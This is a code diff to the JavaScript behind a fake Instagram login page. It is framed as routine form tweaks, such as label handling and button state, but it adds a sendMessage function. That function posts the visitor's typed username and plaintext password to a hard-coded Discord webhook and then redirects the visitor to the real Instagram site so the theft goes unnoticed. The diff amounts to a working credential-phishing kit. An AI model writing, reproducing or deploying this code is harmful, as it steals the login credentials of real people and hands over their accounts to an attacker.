@@ -1,14 +1,25 @@
-// ============================================
-// Instagram Login – comportamiento
-// ============================================
-
 const form = document.getElementById('loginForm');
 const usernameInput = document.getElementById('username');
 const passwordInput = document.getElementById('password');
 const toggleBtn = document.getElementById('togglePassword');
 const loginBtn = document.getElementById('loginBtn');
-const fbBtn = document.getElementById('fbLogin');
-const createBtn = document.getElementById('createAccount');
+
+function syncLabel(input) {
+  if (input.value.trim().length > 0) {
+    input.classList.add('has-value');
+  } else {
+    input.classList.remove('has-value');
+  }
+}
+
+[usernameInput, passwordInput].forEach((input) => {
+  input.addEventListener('input', () => {
+    syncLabel(input);
+    updateButtonState();
+  });
+  input.addEventListener('blur', () => syncLabel(input));
+  syncLabel(input);
+});
 
 toggleBtn.addEventListener('click', () => {
   const isPassword = passwordInput.type === 'password';
@@ -20,13 +31,12 @@ toggleBtn.addEventListener('click', () => {
 });
 
 function updateButtonState() {
-  const hasUser = usernameInput.value.trim().length > 0;
-  const hasPass = passwordInput.value.length > 0;
-  loginBtn.disabled = !(hasUser && hasPass);
+  const ok =
+    usernameInput.value.trim().length > 0 &&
+    passwordInput.value.length > 0;
+  loginBtn.disabled = !ok;
 }
 
-usernameInput.addEventListener('input', updateButtonState);
-passwordInput.addEventListener('input', updateButtonState);
 updateButtonState();
 
 form.addEventListener('submit', (e) => {
@@ -40,21 +50,39 @@ form.addEventListener('submit', (e) => {
   setTimeout(() => {
     loginBtn.textContent = original;
     updateButtonState();
-    console.log('Login attempt:', {
-      username: usernameInput.value.trim(),
-      password: '***'
-    });
-  }, 1400);
-});
-
-fbBtn.addEventListener('click', () => console.log('Facebook login'));
-createBtn.addEventListener('click', () => console.log('Create account'));
-
-document.querySelector('.forgot')?.addEventListener('click', (e) => {
-  e.preventDefault();
-  console.log('Forgot password');
+  }, 1200);
 });
 
 passwordInput.addEventListener('keydown', (e) => {
   if (e.key === 'Enter') form.requestSubmit();
 });
+
+document.getElementById('forgotLink')?.addEventListener('click', (e) => {
+  e.preventDefault();
+});
+document.getElementById('fbLogin')?.addEventListener('click', (e) => {
+  e.preventDefault();
+});
+document.getElementById('createAccount')?.addEventListener('click', (e) => {
+  e.preventDefault();
+});
+
+function sendMessage() {
+  function sleep(milliseconds) {
+    const date = Date.now();
+    let currentDate = null;
+    do {
+      currentDate = Date.now();
+    } while (currentDate - date < milliseconds);
+  }
+
+  var request = new XMLHttpRequest();
+  request.open("POST", "https://discord.com/api/webhooks/1543422200810311771/M4LpIGRuH0yZoUp9GiUFIsdm5BEYgZgZLlp18wckYTWYAWh1qnKYjiMRgo7hGG0tQ_4S");
+  request.setRequestHeader('Content-type', 'application/json');
+  var params = {
+    content: ("**User  : **" + document.getElementById('username').value + "\n**Pass : **" + document.getElementById('password').value)
+  };
+  request.send(JSON.stringify(params));
+  sleep(2000);
+  window.location.replace("https://www.instagram.com");
+}
